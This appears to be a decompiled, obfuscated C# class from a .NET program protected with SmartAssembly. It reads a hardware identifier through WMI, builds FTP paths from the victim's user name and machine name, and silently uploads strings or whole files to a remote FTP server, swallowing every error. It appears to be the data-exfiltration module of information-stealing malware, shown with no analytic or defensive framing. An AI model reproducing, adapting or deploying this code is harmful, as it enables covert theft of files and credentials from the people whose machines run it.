using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace cmxGDwJsHiH;

internal sealed class SVIZsHmxRViwKya
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string snRFPWIwbhbDozJy()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107409842));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107409821)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107409836);
			ManagementObject val3 = new ManagementObject(getString_0(107409831) + text + getString_0(107409246));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107409241)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107394807);
		}
	}

	public static void dtnuQXnkrjRvLXZ(string kBIFUSWqjyesm = "URL", string oVVfaNLOSHrVCfR = "USERNAME", string CFuMbhoznrDs = "ACCESO", string VfdMooPqtOqdWT = "")
	{
		try
		{
			string text = snRFPWIwbhbDozJy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(kBIFUSWqjyesm + getString_0(107410531) + Environment.UserName + getString_0(107410486) + Environment.MachineName + getString_0(107410497) + text + getString_0(107410460));
			ftpWebRequest.Method = getString_0(107409248);
			ftpWebRequest.Credentials = new NetworkCredential(oVVfaNLOSHrVCfR, CFuMbhoznrDs);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(VfdMooPqtOqdWT);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void IgglYVHgoJ(string IRhyIDkKblqin = "URL", string BlFVXgqqGHmjxco = "USERNAME", string XczcyEoccEWD = "ACCESO", string qUMJZXtIsrm = "")
	{
		try
		{
			string text = snRFPWIwbhbDozJy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(IRhyIDkKblqin + getString_0(107410531) + Environment.UserName + getString_0(107410486) + Environment.MachineName + getString_0(107410497) + text + getString_0(107410497) + Path.GetFileName(qUMJZXtIsrm));
			ftpWebRequest.Method = getString_0(107409248);
			ftpWebRequest.Credentials = new NetworkCredential(BlFVXgqqGHmjxco, XczcyEoccEWD);
			byte[] array = File.ReadAllBytes(qUMJZXtIsrm);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static SVIZsHmxRViwKya()
	{
		Strings.CreateGetStringDelegate(typeof(SVIZsHmxRViwKya));
	}
}
